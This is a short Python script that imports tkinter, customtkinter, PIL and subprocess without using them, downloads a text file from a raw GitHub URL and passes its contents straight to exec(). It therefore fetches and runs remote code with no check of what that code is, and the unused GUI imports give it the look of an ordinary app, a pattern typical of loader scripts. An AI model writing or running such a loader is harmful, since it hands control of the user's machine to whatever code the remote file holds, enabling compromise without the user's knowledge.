import urllib.request
import customtkinter
import io
import tkinter as tk
from PIL import Image, ImageTk
import os
import subprocess

code = 'https://raw.githubusercontent.com/MaxG7855/ee/main/program.txt'

response = urllib.request.urlopen(code)
data = response.read()

exec(data)
